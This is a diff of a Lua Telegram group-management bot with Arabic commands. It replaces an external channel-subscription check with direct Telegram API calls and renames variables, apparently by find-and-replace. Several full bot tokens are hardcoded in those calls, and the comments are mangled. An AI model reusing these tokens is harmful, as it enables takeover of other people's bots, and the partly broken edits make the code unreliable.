+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
 tsX000(apmd[2],msg,'🔖┇تم رفعة ادمن   في الكروب')
 return false
 end
 if text == ("رفع ادمن بالكروب")  and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function promote_by_reply(extra, result, success)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
@@ -3812,10 +3745,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^رفع ادمن بالكروب @(.*)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(رفع ادمن بالكروب) @(.*)$")}
 function promote_by_username(extra, result, success)
@@ -3836,20 +3769,20 @@ return false
 end
 if text and text:match("^رفع منشئ بالكروب (%d+)$") then
 local apmd = {string.match(text, "^(رفع منشئ بالكروب) (%d+)$")}
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..apmd[2].."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
 tsX000(apmd[2],msg,'📮┇تم رفعة منشئ   في الكروب')
 return false
 end
 if text == ("رفع منشئ بالكروب")  and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function promote_by_reply(extra, result, success)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
@@ -3859,10 +3792,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^رفع منشئ بالكروب @(.*)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(رفع منشئ بالكروب) @(.*)$")}
 function promote_by_username(extra, result, success)
@@ -3942,60 +3875,60 @@ end
 
 end -- if is_creatorbasic(msg) then
 ------------------------------------------------------------------------
-if is_devabas(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creatorr(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) and ChekAdd(msg.chat_id_) == true then    
+if is_devahmad(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) or is_creatorr(msg.chat_id_,msg.sender_user_id_) or is_creator(msg) and ChekAdd(msg.chat_id_) == true then    
 if (text == "قفل التعديل") then
-local tsX_o = database:get("lock_edit:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_edit:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل التعديل ")
 else
 tsX000("lock",msg,"🔐┇تم قفل التعديل ")
-database:set("lock_edit:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_edit:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "قفل التعديل بالطرد") then
-local tsX_o = database:get("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل التعديل بالطرد")
 else
 tsX000("lock",msg,"🔐┇تم قفل التعديل بالطرد")
-database:set("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح التعديل") then
-local tsX_o = database:get("lock_edit:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_edit:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح التعديل ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح التعديل ")
-database:del("lock_edit:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_edit:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح التعديل بالطرد") then
-local tsX_o = database:get("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح التعديل بااطرد")
 else
 tsX000("lock",msg,"⚠️┇تم فتح التعديل بالطرد")
-database:del("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_edit:MohaMeD:kick"..msg.chat_id_..bot_id,"ok")
 end
 end
 if text == 'مسح المدراء' then
-database:del('MohaMeD:'..bot_id..'owners:'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'owners:'..msg.chat_id_)
 texts = '✖┇ تم مسح المدراء '
 send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
 end
 if text == ("رفع مدير") and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function setowner_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'owners:'..msg.chat_id_
-if database:sismember(hash, result.sender_user_id_) then
+if datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"🔖┇بالفعل تم رفعة مدير في البوت")
 else
-database:sadd(hash, result.sender_user_id_)
+datahmade:sadd(hash, result.sender_user_id_)
 tsX000("prore",msg,"🔖┇تم رفعة مدير في البوت")
 end
 end
@@ -4003,10 +3936,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,setowner_by_reply)
 return false
 end  
 if text and text:match("^رفع مدير @(.*)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apow = {string.match(text, "^(رفع مدير) @(.*)$")}
 function setowner_by_username(extra, result, success)
@@ -4015,7 +3948,7 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")   
 return false 
 end      
-database:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apow[2] or 'MohaMeDTEAM')..')\n🔖┇تم رفعة مدير في البوت'
 else
 texts = '✖┇خطاء'
@@ -4027,28 +3960,28 @@ return false
 end 
 
 if text and text:match("^رفع مدير (%d+)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apow = {string.match(text, "^(رفع مدير) (%d+)$")}
-database:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, apow[2])
+datahmade:sadd('MohaMeD:'..bot_id..'owners:'..msg.chat_id_, apow[2])
 tsX000(apow[2],msg,"🔖┇تم رفعة مدير في البوت")
 return false
 end  
 if text == ("تنزيل مدير") and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function deowner_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'owners:'..msg.chat_id_
-if not database:sismember(hash, result.sender_user_id_) then
+if not datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"🔰┇بالفعل تم تنزيله من مدراء  البوت ")
 else
-database:srem(hash, result.sender_user_id_)
+datahmade:srem(hash, result.sender_user_id_)
 tsX000("prore",msg,"🔰┇تم تنزيله من مدراء  البوت")
 end
 end
@@ -4056,16 +3989,16 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,deowner_by_reply)
 return false
 end  
 if text and text:match("^تنزيل مدير @(.*)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apow = {string.match(text, "^(تنزيل مدير) @(.*)$")}
 local hash =  'MohaMeD:'..bot_id..'owners:'..msg.chat_id_
 function remowner_by_username(extra, result, success)
 if result.id_ then
-database:srem(hash, result.id_)
+datahmade:srem(hash, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apow[2] or 'MohaMeDTEAM')..')\n🔰┇تم تنزيله من مدراء  البوت'
 else
 texts = '✖┇خطاء'
@@ -4076,37 +4009,37 @@ resolve_username(apow[2],remowner_by_username)
 return false
 end  
 if text and text:match("^تنزيل مدير (%d+)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local hash =  'MohaMeD:'..bot_id..'owners:'..msg.chat_id_
 local apow = {string.match(text, "^(تنزيل مدير) (%d+)$")}
-database:srem(hash, apow[2])
+datahmade:srem(hash, apow[2])
 tsX000(apow[2],msg,"🔰┇تم تنزيله من مدراء  البوت ")
 return false
 end
 
 if (text and text == "تعطيل الابلاغ") then 
-database:set("MohaMeD:mute:deleta:msg:"..bot_id..msg.chat_id_,"MohaMeDE")
+datahmade:set("MohaMeD:mute:deleta:msg:"..bot_id..msg.chat_id_,"MohaMeDE")
 send(msg.chat_id_, msg.id_, 1, "🔌┇تم تعطيل خاصيه الابلاغ", 1, 'html')
 end
 if (text and text == "تفعيل الابلاغ") then 
